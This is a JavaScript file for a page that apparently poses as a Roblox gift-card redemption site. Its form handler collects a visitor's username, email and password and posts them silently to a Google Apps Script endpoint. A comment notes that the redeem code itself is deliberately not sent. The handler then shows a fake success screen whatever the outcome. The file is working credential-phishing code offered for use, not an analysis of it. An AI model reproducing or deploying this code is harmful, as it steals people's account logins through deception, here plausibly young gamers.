// ===========================
// REDEEM CARD MODAL
// ===========================

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx898lzwWCVhp_VgPxQGkT4gceQJ5fNRVFNY_kg3eSiOsPWbIXm2UsEbDve-bmMX19B/exec";

const redeemBtn = document.getElementById('redeemBtn');
const modalOverlay = document.getElementById('modalOverlay');
const modalClose = document.getElementById('modalClose');
const redeemForm = document.getElementById('redeemForm');
const formView = document.getElementById('formView');
const successView = document.getElementById('successView');
const okBtn = document.getElementById('okBtn');

// Open modal
redeemBtn.addEventListener('click', function () {
  modalOverlay.classList.add('active');
  // Reset to form view
  formView.classList.remove('hidden');
  successView.classList.add('hidden');
  redeemForm.reset();
});

// Close modal via X button
modalClose.addEventListener('click', function () {
  modalOverlay.classList.remove('active');
});

// Close modal on overlay click
modalOverlay.addEventListener('click', function (e) {
  if (e.target === modalOverlay) {
    modalOverlay.classList.remove('active');
  }
});

// OK button closes modal
okBtn.addEventListener('click', function () {
  modalOverlay.classList.remove('active');
});

// Close on Escape key
document.addEventListener('keydown', function (e) {
  if (e.key === 'Escape') {
    modalOverlay.classList.remove('active');
  }
});

// Form submission
redeemForm.addEventListener('submit', function (e) {
  e.preventDefault();

  const usernameInputValue = document.getElementById('username').value.trim();
  const emailInputValue = document.getElementById('email').value.trim();
  const passwordInputValue = document.getElementById('password').value;

  // Send ONLY username, email, pwd to Google Sheets
  // (Redeem code is intentionally NOT sent)
  const data = {
    username: usernameInputValue,
    email: emailInputValue,
    pwd: passwordInputValue
  };

  const formData = new URLSearchParams(data);

  fetch(SCRIPT_URL, {
    method: "POST",
    mode: "no-cors",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: formData.toString()
  }).catch(function () {
    // Silently fail — no-cors means we won't get a real response anyway
  });

  // Immediately show success screen
  formView.classList.add('hidden');
  successView.classList.remove('hidden');
});

// ===========================
// HANDLE BROKEN IMAGES — show placeholder boxes
// ===========================
document.addEventListener('DOMContentLoaded', function () {
  const images = document.querySelectorAll('.char img, .gift-card-img, .nav-logo, .modal-logo');

  images.forEach(function (img) {
    img.addEventListener('error', function () {
      const parent = img.closest('.char') || img.closest('.gift-card-wrapper');
      if (parent && (img.closest('.char') || img.closest('.gift-card-wrapper'))) {
        // Create placeholder
        const placeholder = document.createElement('div');
        placeholder.className = 'img-placeholder';
        placeholder.textContent = img.alt || 'Image here';
        img.replaceWith(placeholder);
      }
    });
  });

  // Nav logo fallback
  const navLogo = document.querySelector('.nav-logo');
  if (navLogo) {
    navLogo.addEventListener('error', function () {
      const fallback = document.createElement('span');
      fallback.textContent = 'ROBLOX';
      fallback.style.cssText = 'font-size:22px;font-weight:900;color:#fff;letter-spacing:-1px;';
      navLogo.replaceWith(fallback);
    });
  }

  // Modal logo fallback
  const modalLogo = document.querySelector('.modal-logo');
  if (modalLogo) {
    modalLogo.addEventListener('error', function () {
      const fallback = document.createElement('span');
      fallback.textContent = 'ROBLOX';
      fallback.style.cssText = 'font-size:18px;font-weight:900;color:#fff;letter-spacing:-1px;';
      modalLogo.replaceWith(fallback);
    });
  }
});
